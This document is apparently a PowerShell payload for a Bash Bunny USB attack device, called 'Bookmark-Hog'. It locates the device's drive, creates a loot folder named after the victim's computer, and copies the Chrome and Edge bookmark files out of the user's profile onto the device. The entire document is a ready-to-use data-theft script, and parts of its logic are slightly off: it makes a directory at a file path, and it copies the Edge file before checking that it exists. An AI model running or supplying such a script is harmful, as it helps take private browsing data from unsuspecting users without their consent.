#Bookmark-Hog

# Get Drive Letter
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name

# Test if directory exists if not create directory in loot folder to store file
$TARGETDIR = "$bb\loot\Bookmark-Hog\$env:computername\Chromebm.txt"
$TARGETDIR2 = "$bb\loot\Bookmark-Hog\$env:computername\Edgebm.txt"

if(!(Test-Path -Path $TARGETDIR )){
    mkdir $TARGETDIR
}

# See if file is a thing
Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
     try {
         Write-Host "The chrome bookmark file has not been found. "
     }
     catch {
         throw $_.Exception.Message
     }
 }
 # Copy Chrome Bookmarks to Bash Bunny
  else {
     Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$TARGETDIR" 
 }


# See if file is a thing
Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$TARGETDIR2" 

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
    try {
        Write-Host "The edge bookmark file has not been found. "
    }
    catch {
        throw $_.Exception.Message
    }
}
 # Copy Edge Bookmarks to Bash Bunny
 else {
    Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$TARGETDIR2" 
}
